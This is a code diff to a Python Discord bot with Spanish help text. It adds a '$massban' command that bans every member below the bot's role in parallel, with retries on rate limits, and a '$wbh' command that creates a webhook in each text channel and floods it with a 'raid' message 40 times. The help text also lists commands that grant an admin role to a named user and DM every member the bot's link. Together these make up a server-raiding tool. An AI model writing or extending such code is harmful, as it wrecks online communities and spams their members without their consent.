@@ -19,6 +19,101 @@ programmed_servers = set()
 
 @bot.command()
 @commands.has_permissions(administrator=True)
+async def massban(ctx):
+    guild = ctx.guild
+    author = ctx.author
+
+    members_to_ban = [m for m in guild.members if m != author and guild.me.top_role > m.top_role]
+    total = len(members_to_ban)
+    count = 0
+
+    confirm_msg = await ctx.send(
+        f"**Intentando banear {total} miembros...**\n\n"
+        f"Asegúrate de poner el rol del bot **por encima de cualquier otro rol**.\n"
+        f"El bot solo puede banear a los usuarios que estén **bajo** su rol.\n\n"
+        f"Reacciona con ✅ para confirmar o ❌ para cancelar."
+    )
+    await confirm_msg.add_reaction("✅")
+    await confirm_msg.add_reaction("❌")
+
+    def check(reaction, user):
+        return (
+            user == author
+            and str(reaction.emoji) in ["✅", "❌"]
+            and reaction.message.id == confirm_msg.id
+        )
+
+    try:
+        reaction, user = await bot.wait_for("reaction_add", timeout=30.0, check=check)
+    except asyncio.TimeoutError:
+        await ctx.send("Timed out — MassBan cancelado.")
+        return
+
+    if str(reaction.emoji) == "❌":
+        await ctx.send("MassBan Cancelado.")
+        return
+
+    await ctx.send(f"Iniciando baneo a {total} miembros...")
+
+    async with aiohttp.ClientSession() as session:
+        async def ban_member(member):
+            nonlocal count
+            try:
+                url = f"https://discord.com/api/v10/guilds/{guild.id}/bans/{member.id}"
+                headers = {
+                    "Authorization": f"Bot {bot.http.token}",
+                    "Content-Type": "application/json"
+                }
+                json_data = {"delete_message_days": 0, "reason": "Massban"}
+
+                async with session.put(url, json=json_data, headers=headers) as resp:
+                    if resp.status == 429:
+                        data = await resp.json()
+                        retry_after = data.get("retry_after", 1)
+                        await asyncio.sleep(retry_after)
+                        return await ban_member(member)
+                    elif resp.status in (200, 201, 204):
+                        count += 1
+                        print(f"[{count}/{total}] Banned: {member}")
+                    else:
+                        print(f"[!] Error while banning {member}: {resp.status}")
+            except Exception as e:
+                print(f"[!] Can't ban {member}: {e}")
+
+        tasks = [ban_member(m) for m in members_to_ban]
+        await asyncio.gather(*tasks)
+
+    await ctx.send(f"Massban completado — {count}/{total} users baneados.")
+
+@bot.command()
+@commands.has_permissions(administrator=True)
+async def wbh(ctx):
+    guild = ctx.guild
+    msg = "MENSAJE DE RAID (ESTO SE ENVIARA A TODOS LOS CANALES)"
+    cantidad = 40
+    AVATAR_URL = "URL DEL AVATAR"
+    if not guild:
+        return
+
+    async def enviar_en_canal(channel):
+        try:
+            webhook = await channel.create_webhook(name="RBOT ON TOP")
+            tareas = [
+                webhook.send(
+                    f"{msg}",
+                    username="Rbot",
+                    avatar_url=AVATAR_URL
+                )
+                for i in range(cantidad)
+            ]
+            await asyncio.gather(*tareas)
+        except Exception as e:
+            await ctx.send(f"Error en canal {channel.name}: {e}")
+
+    await asyncio.gather(*(enviar_en_canal(channel) for channel in guild.text_channels))
+
+@bot.command()
+@commands.has_permissions(administrator=True)
 async def ret(ctx, cantidad: int = 100):
 
     await ci.callback(ctx)
@@ -495,6 +590,8 @@ paginas = [
             "**Banea a todos los miembros excepto bots con admin.**\n"
              "`$db (ID USUARIO)` –\n"
             "**Desbanea a un usuario por medio de su ID solo si el bot está en el servidor.**\n"
+            "`$wbh` –\n"
+            "**Envía repetidas veces un mensaje de raid.**\n"
         )
     },
     {
@@ -510,6 +607,8 @@ paginas = [
             "**Crea un rol admin y se lo da al usuario si Chuyin está en el servidor.\n"
             "`$md` –\n"
             "**Envía un MD a todos con el link del bot.**\n"
+            "`$massban` –\n"
+            "**Variante actualizada de el comando $bn.**\n"
         )
     },
     {
